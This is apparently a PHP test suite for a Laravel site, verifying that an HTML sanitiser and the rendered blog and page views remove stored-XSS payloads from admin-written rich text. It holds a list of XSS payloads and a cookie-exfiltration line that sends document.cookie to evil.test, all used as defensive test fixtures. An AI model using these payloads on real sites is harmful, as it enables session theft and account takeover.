<?php

declare(strict_types=1);

use App\Models\Page;
use App\Models\PageSection;
use App\Models\Post;
use App\Support\Html;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Symfony\Component\Finder\SplFileInfo;

/**
 * Rich text written in the admin, rendered on a public page.
 *
 * §9's table already carries one of these: stored XSS through the speaker social
 * URLs, found by writing straight to the database rather than through the form.
 * The lesson there is the one that applies here — **the form validating is not the
 * reader being safe** — and the blog body had exactly the same shape. The old
 * comment on the rich-text block said what arrives is "a small, known set of
 * tags because the toolbar is deliberately short", which describes what the
 * editor *offers* rather than what the column *holds*. A paste, a seeder, an
 * import or a direct UPDATE all bypass the toolbar.
 *
 * Author-supplied rather than visitor-supplied, so it needs a Content Editor
 * account or a compromised one. That lowers the likelihood and not the impact:
 * the payload runs for every visitor to a public article.
 */

// The payloads -------------------------------------------------------------------------

/** @return array<string, string> */
function xssPayloads(): array
{
    return [
        'a script tag' => '<script>alert(1)</script>',
        // The one that survives innerHTML parsing, which is why escaping alone
        // is not the answer for a field that must keep its formatting.
        'an onerror handler' => '<img src=x onerror=alert(1)>',
        'an onload handler' => '<svg onload=alert(1)>',
        'a javascript: link' => '<a href="javascript:alert(1)">click</a>',
        'an iframe' => '<iframe src="https://evil.test"></iframe>',
        'a style block' => '<style>body{display:none}</style>',
        'an inline event on a permitted tag' => '<p onmouseover="alert(1)">hover</p>',
        'a form' => '<form action="https://evil.test"><input name="card"></form>',
        'an object embed' => '<object data="https://evil.test"></object>',
    ];
}

// The helper ---------------------------------------------------------------------------

it('strips a payload from rich text', function (string $payload): void {
    $clean = Html::sanitize("<p>Before.</p>{$payload}<p>After.</p>");

    expect($clean)
        ->not->toContain('alert(1)')
        ->not->toContain('<script')
        ->not->toContain('onerror')
        ->not->toContain('onload')
        ->not->toContain('onmouseover')
        ->not->toContain('javascript:')
        ->not->toContain('<iframe')
        ->not->toContain('<style')
        ->not->toContain('<form')
        ->not->toContain('<object')
        // The article before the payload survives. Only "before" is asserted
        // here: an *unclosed* element — `<svg onload=…>` with no closing tag —
        // legitimately consumes the rest of the document as its children, so
        // dropping it drops them. See the note below.
        ->toContain('Before.');
})->with(xssPayloads());

/*
 * A well-formed payload leaves the article either side of it intact. This is the
 * assertion the shared test above cannot make, and it is the one that matters:
 * a sanitiser that ate people's writing would be switched off within a month.
 */
it('removes a well-formed payload and keeps everything around it', function (): void {
    $clean = Html::sanitize('<p>Before.</p><script>alert(1)</script><p>After.</p>');

    expect($clean)->toContain('Before.')
        ->toContain('After.')
        ->not->toContain('alert(1)');
});

/*
 * Recorded rather than fixed, because it cannot be fixed without allowing SVG —
 * and inline SVG is one of the better-known XSS vectors, so that trade is the
 * wrong way round.
 *
 * An author who pastes an unclosed `<svg>` loses the rest of the article body.
 * It needs hand-written or pasted-in markup to happen at all, since the editor
 * closes its own tags, and `Html::isClean()` exists so a screen can warn about
 * it. Worth knowing before somebody reports it as the sanitiser "eating" a page.
 */
it('drops what an unclosed dangerous element swallows, by design', function (): void {
    expect(Html::sanitize('<p>Kept.</p><svg onload=alert(1)><p>Lost.</p>'))
        ->toContain('Kept.')
        ->not->toContain('alert(1)')
        ->not->toContain('Lost.');
});

it('keeps the formatting an article actually uses', function (): void {
    $article = <<<'HTML'
        <h2>Why FMLA matters</h2>
        <p>Some <strong>bold</strong> and <em>italic</em> text with a
        <a href="https://example.test/guide" title="Guide">link</a>.</p>
        <ul><li>First</li><li>Second</li></ul>
        <ol><li>Step one</li></ol>
        <blockquote><p>A quotation.</p></blockquote>
        <table><thead><tr><th>Body</th></tr></thead><tbody><tr><td>HRCI</td></tr></tbody></table>
        <img src="https://example.test/chart.png" alt="A chart">
        <pre><code>$credits = 1.5;</code></pre>
        HTML;

    $clean = Html::sanitize($article);

    foreach (['<h2', '<strong>', '<em>', 'https://example.test/guide', '<ul>', '<li>',
        '<ol>', '<blockquote>', '<table>', '<th>', '<td>', '<img', 'alt="A chart"',
        '<pre>', '<code>'] as $kept) {
        expect($clean)->toContain($kept);
    }
});

it('leaves an empty body empty rather than returning markup', function (): void {
    expect(Html::sanitize(null))->toBe('')
        ->and(Html::sanitize(''))->toBe('')
        ->and(trim(Html::sanitize('   ')))->toBe('');
});

/*
 * A relative link is how an author links to another article on the site. Dropping
 * it would quietly break internal linking, which is an SEO concern on a business
 * §3 says "lives on" search.
 */
it('keeps a relative link to another page on the site', function (): void {
    expect(Html::sanitize('<a href="/blog/fmla-compliance">Read more</a>'))
        ->toContain('/blog/fmla-compliance');
});

// The public pages ---------------------------------------------------------------------

/*
 * The test that would have caught the original. Written against the rendered
 * page rather than the helper, because the helper being right is worth nothing
 * if the view does not call it.
 */
it('serves no payload on a published article', function (string $payload): void {
    $post = Post::factory()->published()->create([
        'body' => "<p>Real article text.</p>{$payload}",
    ]);

    $response = $this->get('/blog/'.$post->slug)->assertSuccessful();

    expect($response->getContent())
        ->toContain('Real article text.')
        ->not->toContain('alert(1)')
        ->not->toContain('onerror')
        ->not->toContain('<iframe');
})->with(xssPayloads());

it('serves no payload from a rich text block on a page', function (): void {
    $page = Page::factory()->published()->create(['slug' => 'about-us']);

    PageSection::factory()->for($page)->create([
        'type' => 'rich_text',
        'data' => [
            'heading' => 'About us',
            'body' => '<p>Real page text.</p><img src=x onerror=alert(1)><script>alert(1)</script>',
        ],
    ]);

    $response = $this->get('/about-us')->assertSuccessful();

    expect($response->getContent())
        ->toContain('Real page text.')
        ->not->toContain('alert(1)')
        ->not->toContain('onerror');
});

/*
 * Written straight to the column, bypassing the form entirely — which is how the
 * speaker social-URL hole was found. The reader has to be safe however the value
 * arrived, because the toolbar only constrains the toolbar.
 */
it('is safe against a payload written directly to the database', function (): void {
    $post = Post::factory()->published()->create();

    DB::table('posts')->where('id', $post->getKey())->update([
        'body' => '<p>Text.</p><img src=x onerror="fetch(\'https://evil.test/\'+document.cookie)">',
    ]);

    $response = $this->get('/blog/'.$post->fresh()->slug)->assertSuccessful();

    expect($response->getContent())
        ->not->toContain('onerror')
        ->not->toContain('evil.test');
});

// Nothing echoes rich text raw ----------------------------------------------------------

/*
 * The structural guard. A sanitiser nobody calls is decoration, and the next
 * rich-text block or article template is exactly where somebody writes
 * `{!! $value !!}` because the one above it did.
 *
 * Raw echoes that are genuinely safe are listed by name with a reason, the same
 * shape as SettingRegistryTest's exception list. Naming them keeps them visible;
 * an unexplained entry is the one that turns out to be a hole.
 */
it('echoes no rich text without sanitising it', function (): void {
    $allowed = [
        // Escaped first, then nl2br. Correct, and the pattern the others should
        // have followed.
        'components/blog/comments.blade.php' => 'e() before nl2br, so the body is escaped.',
        // nl2br over an e()-escaped badge, so the line-break markup is the only
        // HTML and the client's copy can never inject its own.
        'components/home/accreditation.blade.php' => 'e() before nl2br, so the badge is escaped.',
        // Same pattern: nl2br over the e()-escaped business address, so the only
        // HTML is the line breaks and the setting's value cannot inject its own.
        'contact/index.blade.php' => 'e() before nl2br, so the address is escaped.',
        // A map of Lucide SVG paths written in the file itself, looked up by a
        // template-supplied name with '' for an unknown key. Nothing stored
        // reaches it.
        'components/ui/icon.blade.php' => 'Inlined Lucide paths, keyed by a literal name.',
        // json_encode with JSON_HEX_TAG escapes </script>, so a value cannot
        // break out of the JSON-LD block. See partials/schema.blade.php.
        'partials/schema.blade.php' => 'JSON-LD via json_encode with JSON_HEX_TAG, not rich text.',
    ];

    $offenders = [];

    foreach (File::allFiles(resource_path('views')) as $file) {
        /** @var SplFileInfo $file */
        $relative = str_replace('\\', '/', $file->getRelativePathname());

        if (array_key_exists($relative, $allowed)) {
            continue;
        }

        $source = (string) file_get_contents($file->getPathname());

        // Every raw echo on one line, minus the framework helpers that return
        // markup by design.
        preg_match_all('/\{!!(.+?)!!\}/s', $source, $matches);

        foreach ($matches[1] ?? [] as $echo) {
            if (preg_match('/csrf|method_field|Html::sanitize|\$slot|->render\(\)|Blade::|__\(/', $echo) === 1) {
                continue;
            }

            $offenders[] = $relative.': {!!'.trim($echo).'!!}';
        }
    }

    expect($offenders)->toBe([]);
});

it('has no stale entries in the list of raw echoes held on purpose', function (string $path): void {
    expect(file_exists(resource_path('views/'.$path)))->toBeTrue(
        "{$path} is listed as a permitted raw echo but no longer exists. Remove the entry."
    );
})->with([
    'components/blog/comments.blade.php',
    'components/home/accreditation.blade.php',
    'contact/index.blade.php',
    'components/ui/icon.blade.php',
    'partials/schema.blade.php',
]);
